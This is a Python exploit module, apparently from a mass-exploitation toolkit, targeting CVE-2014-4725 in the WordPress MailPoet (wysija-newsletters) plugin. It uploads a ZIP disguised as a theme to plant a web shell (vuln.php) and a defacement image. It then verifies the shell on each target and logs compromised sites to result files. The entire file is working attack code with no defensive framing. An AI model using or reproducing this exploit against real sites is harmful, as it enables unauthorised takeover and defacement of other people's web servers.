# coding=utf-8
import requests
import printModule

MailPoetZipShell = 'files/rock.zip'
Headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'
}

def Exploit(site):
    try:
        FileShell = {'my-theme': open(MailPoetZipShell, 'rb')}
        PostData = {'action': "themeupload", 'submitter': "Upload", 'overwriteexistingtheme': "on",
                    'page': 'GZNeFLoZAb'}
        UserAgent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
        url = "http://" + site + "/wp-admin/admin-post.php?page=wysija_campaigns&action=themes"
        GoT = requests.post(url, files=FileShell, data=PostData, headers=UserAgent, timeout=10)
        if 'page=wysija_campaigns&amp;action=themes&amp;reload=1' in str(GoT.content):
            sh = 'http://' + site + '/wp-content/uploads/wysija/themes/rock/vuln.php'
            index = 'http://' + site + '/wp-content/uploads/wysija/themes/rock/pwn.gif'
            CheckShell = requests.get(sh, timeout=10, headers=Headers)
            CheckIndex = requests.get(index, timeout=10, headers=Headers)
            if 'Vuln!!' in str(CheckShell.content):
                with open('result/Shell_results.txt', 'a') as writer:
                    writer.write(site + '/wp-content/uploads/wysija/themes/rock/vuln.php' + '\n')
                if 'GIF89a' in str(CheckIndex.content):
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(site + '/wp-content/uploads/wysija/themes/rock/pwn.gif' + '\n')
                return printModule.returnYes(site, 'CVE-2014-4725', 'wysija-newsletters', 'Wordpress')
            else:
                return printModule.returnNo(site, 'CVE-2014-4725', 'wysija-newsletters', 'Wordpress')
        else:
            return printModule.returnNo(site, 'CVE-2014-4725', 'wysija-newsletters', 'Wordpress')
    except:
        return printModule.returnNo(site, 'CVE-2014-4725', 'wysija-newsletters', 'Wordpress')
